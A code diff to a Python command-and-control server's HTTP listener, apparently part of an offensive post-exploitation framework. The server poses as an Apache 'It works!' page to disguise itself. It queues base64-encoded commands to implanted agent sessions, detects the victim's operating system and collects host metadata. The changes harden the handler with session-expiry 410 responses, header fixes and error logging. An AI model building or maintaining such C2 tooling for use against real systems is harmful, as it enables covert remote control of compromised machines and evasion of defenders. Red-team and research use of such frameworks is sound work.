@@ -49,13 +49,15 @@ class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
 
 
 def _serve_benign(handler):
+	body = b"<html><body><h1>It works!</h1></body></html>"
 	handler.send_response(200)
 	handler.send_header("Date", handler.date_time_string())
 	handler.send_header("Server", "Apache/2.4.41 (Ubuntu)")
 	handler.send_header("Connection", "close")
 	handler.send_header("Content-Type", "text/html; charset=UTF-8")
+	handler.send_header("Content-Length", str(len(body)))
 	handler.end_headers()
-	handler.wfile.write(b"<html><body><h1>It works!</h1></body></html>")
+	handler.wfile.write(body)
 
 
 class C2HTTPRequestHandler(BaseHTTPRequestHandler):
@@ -107,6 +109,10 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 		try:
 			with _reg_lock:
 				lid = socket_to_listener.get(self.server.socket.fileno())
+				if not lid or lid not in listener_registry:
+					self.send_response(503)
+					self.end_headers()
+					return
 				listener = listener_registry[lid]
 			profile = self._select_profile(listener)
 			#print(f"RAW REQUEST: {self.requestline}")
@@ -158,12 +164,22 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 							_raw_printer=print_override._orig_print,
 							end='\n')
 
-				session = session_manager.sessions[sid]
+				session = session_manager.sessions.get(sid)
+				if session is None:
+					# Unknown/expired SID — treat as permanently gone (quiet)
+					self.send_response(410, "Gone")
+					self.end_headers()
+					return
 
 				with _reg_lock:
 					lid = socket_to_listener.get(self.server.socket.fileno())
 					if lid:
-						listener_registry[lid].sessions.append(sid)
+						s = getattr(listener_registry[lid], "sessions", None)
+						if s is None or not isinstance(s, (set, list)):
+							listener_registry[lid].sessions = set()
+
+						if sid not in listener_registry[lid].sessions:
+							listener_registry[lid].sessions.append(sid)
 
 				# queue up your commands exactly as before…
 				try:
@@ -273,12 +289,22 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 							_raw_printer=print_override._orig_print,
 							end='\n')
 
-				session = session_manager.sessions[sid]
+				session = session_manager.sessions.get(sid)
+				if session is None:
+					# Unknown/expired SID — treat as permanently gone (quiet)
+					self.send_response(410, "Gone")
+					self.end_headers()
+					return
 
 				with _reg_lock:
 					lid = socket_to_listener.get(self.server.socket.fileno())
 					if lid:
-						listener_registry[lid].sessions.append(sid)
+						s = getattr(listener_registry[lid], "sessions", None)
+						if s is None or not isinstance(s, (set, list)):
+							listener_registry[lid].sessions = set()
+							
+						if sid not in listener_registry[lid].sessions:
+							listener_registry[lid].sessions.append(sid)
 			
 				try:
 					cmd_b64 = session.meta_command_queue.get_nowait()
@@ -376,8 +402,10 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 						#print(f"[DEBUG] Parsed JSON: {msg}")
 					
 					except json.JSONDecodeError as e:
-						print(f"[!] JSON decode error: {e}")
+						#print(f"[!] JSON decode error: {e}")
 						self.send_response(400)
+						self.send_header("Connection", "close")
+						self.send_header("Content-Length", "0")
 						self.end_headers()
 						return
 
@@ -398,7 +426,17 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 					except Exception as e:
 						print("Failed to decode base64")
 
-					session = session_manager.sessions[sid]
+					if sid in session_manager.dead_sessions:
+						self.send_response(410, "Gone")
+						self.end_headers()
+						return
+
+					session = session_manager.sessions.get(sid)
+					if session is None:
+						# Unknown/expired SID — treat as permanently gone (quiet)
+						self.send_response(410, "Gone")
+						self.end_headers()
+						return
 
 
 					"""cwd = msg.get("cwd")
@@ -413,7 +451,7 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 					last_mode = session.last_cmd_type
 					if last_mode == "meta":
 						if session.mode == "detect_os":
-							#print(f"[DEBUG] HTTP agent {sid} OS check: {output}")
+							print(f"[DEBUG] HTTP agent {sid} OS check: {output}")
 							session.detect_os(output)
 
 							# Queue OS-specific metadata commands
@@ -439,6 +477,27 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 
 						if session.metadata_stage < len(session.metadata_fields):
 							field = session.metadata_fields[session.metadata_stage]
+							"""_, cmd = session.os_metadata_commands[session.metadata_stage]
+
+							cleaned = utils.normalize_output(output, cmd)
+							low = cleaned.lower()
+							error_markers = (
+								"access is denied",
+								"permission denied",
+								"not recognized",
+								"fullyqualifiederrorid",
+								"categoryinfo",
+							)
+
+							if not cleaned.strip() or any(m in low for m in error_markers):
+								value = "N/A"
+							else:
+								# first non-empty line after normalization
+								value = next((ln.strip() for ln in cleaned.splitlines() if ln.strip()), "N/A")
+
+							session.metadata[field] = value
+							session.metadata_stage += 1"""
+
 							lines = [
 								line.strip()
 								for line in output.splitlines()
@@ -510,10 +569,15 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 					self.send_header("Connection", "close")
 					self.end_headers()
 
+				except KeyError:
+					# Race or late POST from dead/unknown SID
+					self.send_response(410, "Gone")
+					self.end_headers()
+					return
+
 				except Exception as e:
-					print(f"error: {e}")
-					print("HIT 400 ERROR")
-					self.send_response(400)
+					logger.exception(f"ERROR in do_POST {e}")
+					self.send_response(500)	
 					self.end_headers()
 
 			else:
@@ -542,8 +606,10 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 						#print(f"[DEBUG] Parsed JSON: {msg}")
 					
 					except json.JSONDecodeError as e:
-						print(f"[!] JSON decode error: {e}")
+						#print(f"[!] JSON decode error: {e}")
 						self.send_response(400)
+						self.send_header("Connection", "close")
+						self.send_header("Content-Length", "0")
 						self.end_headers()
 						return
 
@@ -559,7 +625,17 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 					except Exception as e:
 						print("Failed to decode base64")
 
-					session = session_manager.sessions[sid]
+					if sid in session_manager.dead_sessions:
+						self.send_response(410, "Gone")
+						self.end_headers()
+						return
+
+					session = session_manager.sessions.get(sid)
+					if session is None:
+						# Unknown/expired SID — treat as permanently gone (quiet)
+						self.send_response(410, "Gone")
+						self.end_headers()
+						return
 
 
 					"""cwd = msg.get("cwd")
@@ -598,18 +674,39 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 							session.metadata_stage += 1
 							session.mode = "cmd"
 
-
-
 						#logger.debug(brightred + f"MODE: {session.mode}, stage: {session.metadata_stage}, field: {session.metadata_fields[session.metadata_stage]}")
 
 						if session.metadata_stage < len(session.metadata_fields):
 							logger.debug(brightred + f"METADATA STAGE IS LESS THAN FIELDS, stage: {session.metadata_stage}, field: {session.metadata_fields[session.metadata_stage]}")
 							field = session.metadata_fields[session.metadata_stage]
+							"""_, cmd = session.os_metadata_commands[session.metadata_stage]
+
+							cleaned = utils.normalize_output(output, cmd)
+							low = cleaned.lower()
+							error_markers = (
+								"access is denied",
+								"permission denied",
+								"not recognized",
+								"fullyqualifiederrorid",
+								"categoryinfo",
+							)
+
+							if not cleaned.strip() or any(m in low for m in error_markers):
+								value = "N/A"
+							else:
+								# first non-empty line after normalization
+								value = next((ln.strip() for ln in cleaned.splitlines() if ln.strip()), "N/A")
+
+							session.metadata[field] = value
+							session.metadata_stage += 1"""
+
 							lines = [
 								line.strip()
 								for line in output.splitlines()
 								if line.strip() not in ("$", "#", ">") and line.strip() != ""
 							]
+
+							logger.debug(brightgreen + f"Found Lines {lines} for field {field}" + reset)
 
 							if len(lines) > 1:
 								clean = lines[1] if lines else ""
@@ -652,11 +749,15 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 					self.send_header("Content-Length", "0")
 					self.end_headers()
 
+				except KeyError:
+					# Race or late POST from dead/unknown SID
+					self.send_response(410, "Gone")
+					self.end_headers()
+					return
+
 				except Exception as e:
-					print(f"error: {e}")
-					logger.debug(brightred + f"ERROR IN HTTP POST FUNCTION {e}")
-					print("HIT 400 ERROR")
-					self.send_response(400)
+					logger.exception(f"ERROR in do_POST {e}")
+					self.send_response(500)	
 					self.end_headers()
 
 		except (ConnectionResetError, BrokenPipeError):
